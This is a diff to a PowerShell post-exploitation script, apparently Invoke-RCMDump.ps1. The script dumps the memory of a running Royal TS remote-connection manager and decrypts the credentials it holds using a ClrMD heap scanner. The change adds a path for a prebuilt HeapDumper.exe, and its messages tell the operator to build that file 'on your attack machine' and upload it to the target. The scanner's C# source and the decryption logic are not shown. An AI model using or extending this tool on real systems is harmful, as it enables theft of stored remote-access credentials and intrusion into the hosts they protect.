@@ -547,10 +547,47 @@ if ($Mode -eq 'dump') {
 
     Write-Host "[+] Target: $($proc.ProcessName) (PID: $($proc.Id), $([math]::Round($proc.WorkingSet64/1MB))MB)" -ForegroundColor Green
 
-    $projectDir = Join-Path $env:TEMP "RCMDump_ClrMD"
+    # Detect Royal TS install dir for SecurityInterface decryption
+    $rtInstallDir = $null
+    try {
+        $rtInstallDir = Split-Path $proc.MainModule.FileName
+    } catch {}
+    if (-not $rtInstallDir -or -not (Test-Path "$rtInstallDir\RoyalDocument.SecurityInterface.dll")) {
+        $rtInstallDir = @(
+            "$env:ProgramFiles\Royal TS V5",
+            "$env:ProgramFiles\Royal TS V6",
+            "$env:ProgramFiles\Royal TS V7",
+            "$env:ProgramFiles\Royal TS V8",
+            "${env:ProgramFiles(x86)}\Royal TS V5",
+            "${env:ProgramFiles(x86)}\Royal TS V6",
+            "${env:ProgramFiles(x86)}\Royal TS V7"
+        ) | Where-Object { Test-Path "$_\RoyalDocument.SecurityInterface.dll" } | Select-Object -First 1
+    }
+    if (-not $rtInstallDir) { $rtInstallDir = "." }
+    Write-Host "[*] Royal TS dir: $rtInstallDir" -ForegroundColor DarkGray
 
-    $csprojPath = Join-Path $projectDir "HeapDumper.csproj"
-    $hashFile = Join-Path $projectDir ".cs_hash"
+    # --- Find scanner binary ---
+    # Priority 1: Pre-built HeapDumper.exe next to script (for targets without .NET SDK)
+    $scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Definition
+    $prebuiltExe = Join-Path $scriptDir "HeapDumper.exe"
+    $scannerCmd = $null
+
+    if (Test-Path $prebuiltExe) {
+        Write-Host "[*] Using pre-built scanner: $prebuiltExe" -ForegroundColor DarkGray
+        $scannerCmd = "& `"$prebuiltExe`" $($proc.Id) `"$rtInstallDir`""
+    } else {
+        # Priority 2: dotnet SDK build
+        if (-not $dotnetTfm) {
+            Write-Host "[!] No .NET SDK found and no HeapDumper.exe next to script." -ForegroundColor Red
+            Write-Host "[!] Build HeapDumper.exe on your attack machine:" -ForegroundColor Red
+            Write-Host "      cd HeapDumper && dotnet publish -c Release -r win-x64 --self-contained -p:PublishSingleFile=true" -ForegroundColor Yellow
+            Write-Host "[!] Then upload HeapDumper.exe next to Invoke-RCMDump.ps1" -ForegroundColor Red
+            exit 1
+        }
+        $projectDir = Join-Path $env:TEMP "RCMDump_ClrMD"
+        $csprojPath = Join-Path $projectDir "HeapDumper.csproj"
+        $hashFile = Join-Path $projectDir ".cs_hash"
+    }
 
     $csCode = @'
 using System;
@@ -783,18 +820,19 @@ class Program
     }
 }
 '@
-    # Build hash includes both C# code AND target framework to force rebuild on SDK change
-    $fullHash = [System.BitConverter]::ToString([System.Security.Cryptography.MD5]::Create().ComputeHash(
-        [System.Text.Encoding]::UTF8.GetBytes($csCode + $dotnetTfm)
-    )).Replace('-','')
-    $oldHash = if (Test-Path $hashFile) { (Get-Content $hashFile -Raw).Trim() } else { '' }
-    $needsSetup = (-not (Test-Path $csprojPath)) -or ($fullHash -ne $oldHash)
-    if ($needsSetup) {
-        Write-Host "[*] Setting up ClrMD project..." -ForegroundColor Cyan
-        New-Item -ItemType Directory -Force -Path $projectDir | Out-Null
-        Remove-Item (Join-Path $projectDir "bin") -Recurse -Force -ErrorAction SilentlyContinue
-        Remove-Item (Join-Path $projectDir "obj") -Recurse -Force -ErrorAction SilentlyContinue
-        @"
+    if (-not $scannerCmd) {
+        # Build from source using dotnet SDK
+        $fullHash = [System.BitConverter]::ToString([System.Security.Cryptography.MD5]::Create().ComputeHash(
+            [System.Text.Encoding]::UTF8.GetBytes($csCode + $dotnetTfm)
+        )).Replace('-','')
+        $oldHash = if (Test-Path $hashFile) { (Get-Content $hashFile -Raw).Trim() } else { '' }
+        $needsSetup = (-not (Test-Path $csprojPath)) -or ($fullHash -ne $oldHash)
+        if ($needsSetup) {
+            Write-Host "[*] Setting up ClrMD project ($dotnetTfm)..." -ForegroundColor Cyan
+            New-Item -ItemType Directory -Force -Path $projectDir | Out-Null
+            Remove-Item (Join-Path $projectDir "bin") -Recurse -Force -ErrorAction SilentlyContinue
+            Remove-Item (Join-Path $projectDir "obj") -Recurse -Force -ErrorAction SilentlyContinue
+            @"
 <Project Sdk="Microsoft.NET.Sdk">
   <PropertyGroup>
     <OutputType>Exe</OutputType>
@@ -806,40 +844,23 @@ class Program
   </ItemGroup>
 </Project>
 "@ | Set-Content (Join-Path $projectDir "HeapDumper.csproj") -Encoding utf8
-        $csCode | Set-Content (Join-Path $projectDir "Program.cs") -Encoding utf8
-        Write-Host "[*] Restoring NuGet packages..." -ForegroundColor Cyan
-        Push-Location $projectDir
-        $restoreOut = dotnet restore --verbosity quiet 2>&1
-        Pop-Location
-        if ($LASTEXITCODE -ne 0) {
-            Write-Host "[!] NuGet restore failed:" -ForegroundColor Red
-            $restoreOut | ForEach-Object { Write-Host "    $_" -ForegroundColor Red }
-            exit 1
+            $csCode | Set-Content (Join-Path $projectDir "Program.cs") -Encoding utf8
+            Write-Host "[*] Restoring NuGet packages..." -ForegroundColor Cyan
+            Push-Location $projectDir
+            $restoreOut = dotnet restore --verbosity quiet 2>&1
+            Pop-Location
+            if ($LASTEXITCODE -ne 0) {
+                Write-Host "[!] NuGet restore failed:" -ForegroundColor Red
+                $restoreOut | ForEach-Object { Write-Host "    $_" -ForegroundColor Red }
+                exit 1
+            }
+            $fullHash | Set-Content $hashFile -NoNewline
         }
-        $fullHash | Set-Content $hashFile -NoNewline
+        $scannerCmd = "dotnet run --project `"$projectDir`" -c Release -- $($proc.Id) `"$rtInstallDir`""
     }
-
-    # Detect Royal TS install dir for SecurityInterface decryption
-    $rtInstallDir = $null
-    try {
-        $rtInstallDir = Split-Path $proc.MainModule.FileName
-    } catch {}
-    if (-not $rtInstallDir -or -not (Test-Path "$rtInstallDir\RoyalDocument.SecurityInterface.dll")) {
-        $rtInstallDir = @(
-            "$env:ProgramFiles\Royal TS V5",
-            "$env:ProgramFiles\Royal TS V6",
-            "$env:ProgramFiles\Royal TS V7",
-            "$env:ProgramFiles\Royal TS V8",
-            "${env:ProgramFiles(x86)}\Royal TS V5",
-            "${env:ProgramFiles(x86)}\Royal TS V6",
-            "${env:ProgramFiles(x86)}\Royal TS V7"
-        ) | Where-Object { Test-Path "$_\RoyalDocument.SecurityInterface.dll" } | Select-Object -First 1
-    }
-    if (-not $rtInstallDir) { $rtInstallDir = "." }
-    Write-Host "[*] Royal TS dir: $rtInstallDir" -ForegroundColor DarkGray
 
     Write-Host "[*] Running ClrMD heap scan + decrypt..." -ForegroundColor Cyan
-    $output = dotnet run --project $projectDir -c Release -- $proc.Id "`"$rtInstallDir`"" 2>&1
+    $output = Invoke-Expression "$scannerCmd 2>&1"
 
     # Show ALL output for debugging if no results found
     $hasResults = $false
